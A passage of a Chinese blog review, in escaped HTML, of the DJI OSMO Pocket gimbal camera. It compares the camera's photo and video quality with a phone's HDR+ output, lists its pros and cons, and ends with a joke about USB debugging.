https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-1024x557.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>当时没有拍对比照，另外用手机拍了一张大光比场景做个观感对比 (HDR+直出)</p>\n<p>夜景照片没来得及单独测试，不过从夜景延时视频的原始图像来看只能说一般般，噪点有些多，大光比场景看起来难以驾驭。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1004\" class=\"aligncenter size-full wp-image-1340 srcset=\" https: sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>夜景延时视频其中一帧的原始图像</p>\n<p>视频也类似，看得出有涂抹感，而且在大光比下容易过曝/欠曝，不过码率挺高，看起来没怎么压缩。照片看起来有所压缩，而全景则被缩放得非常厉害，基本不能放大看，不知道这是不是因为通过 APP 导出的问题，希望可以在 SD 卡中找到未压缩的原始图像。<strong>总之不管这个镜头的素质如何，最后的产出和手机相比并没有什么优势。</strong>甚至在我手机有 Google 的 HDR+ 算法加持的情况下，OSMO Pocket 的照片从观感上来说可以算是被吊打。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2490\" height=\"631\" class=\"aligncenter size-full wp-image-1335\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg 2490w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-300x76.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-768x195.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-1024x259.jpg 1024w\" sizes=\"(max-width: 2490px) 100vw, 2490px\"></a>\n<p>这张图直出尺寸只有 3984×1006</p>\n<h1>总结</h1>\n<p>OSMO Pocket 是一款优点和缺点都非常明显的产品，简单总结一下它的优缺点吧。</p>\n<p>优点：</p>\n<ul>\n<li>非常便携且启动快，可以快速进入拍摄状态</li>\n<li>优秀的防抖云台</li>\n<li>操作简单且效率高，容易上手</li>\n<li>功能还算丰富，可以满足一部分自定义的需求</li>\n<li>配合 APP 可以方便地进行拍摄分享</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>拍摄的质量与大部分手机相比没有优势</li>\n<li>贵，尤其是还有一大堆配件是需要额外购买的</li>\n<li>耗电快，续航时间比我想象的要短</li>\n<li>收音质量有待提高，镜头视角也“还不够广”</li>\n<li>部分功能感觉还有待完善</li>\n</ul>\n<p>总之，OSMO Pocket “在技术上”可以称得上是一款优秀的产品，这么小的体积却提供了优秀的防抖云台、完善的操作逻辑和不输手机的拍摄质量，很棒；<strong>但是在实用性上它的价值可能不是很高，较高的价格却无法提供相应的拍摄质量，而且对于大部分人来说，“快速进入拍摄”并不是一个痛点，这样的话，还是选择手机云台甚至相机云台吧。</strong></p>\n<p>顺便一提，由于 OSMO Pocket 在连接 Android 手机时会使用“USB 调试”功能，每当它连上我的手机时…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1080\" height=\"711\" class=\"aligncenter size-full wp-image-1318\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg 1080w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-300x198.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-768x506.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-1024x674.jpg 1024w\" sizes=\"(max-width: 1080px) 100vw, 1080px\"></a>\n<p>黑阈：？？？</p>\n<p>(╯‵□′)╯︵┻━┻</p>\n","link":"https://flyhigher.top/photograph/1309.html"}]